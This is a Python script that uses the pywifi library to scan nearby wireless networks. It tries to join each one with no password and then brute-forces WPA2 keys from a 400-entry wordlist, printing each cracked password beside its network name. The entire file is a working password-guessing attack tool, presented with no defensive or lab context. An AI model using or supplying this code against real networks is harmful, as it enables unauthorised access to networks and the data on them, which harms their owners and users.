import time
import pywifi
from pywifi import const

available_devices = []
keys = []
final_output = {}

wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]


print(interface.name())


interface.scan()

time.sleep(5) 

x = interface.scan_results()
print(type(x))

for i in x:
    available_devices.append(i.ssid)



for i in available_devices:
    print ("{:<5} => {:}".format("Host Name", i))


for i in available_devices:
    nm = i
    i=i.strip()
    profile = pywifi.Profile()
    profile.ssid = i
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)
    iface.connect(profile)
    time.sleep(4)
    if iface.status() == const.IFACE_CONNECTED:
        print('success password of the network',i,' is',"none")
        final_output[i] = ""
        available_devices.remove(nm)



with open('top400.txt','r') as f:
    for i in f:
        i = i.replace('\n','')
        if i not in keys:
            keys.append(i)


print(keys)



try:
    for i in available_devices:
        profile = pywifi.Profile()
        i=i.strip()
        profile.ssid = i
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        flag=0
        for j in keys:
            j=j.strip()
            profile.key = j
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print('success password of the network',i,' is',j)
                final_output[i] = j
                flag=1
                break
except Exception as e:
    print(e)
        #if flag == 0:
        #print('sorry we are not able to CRACK PASSWORD of',i)



print('*'*10,'Discovered Password','*'*10)
print("{0:<12} {1:<}".format("HOST NAME","PASSWORD"))
for SSID,Key in final_output.items():
    print ("{:<12}|{:<12}".format(SSID, Key))
available_devices.clear()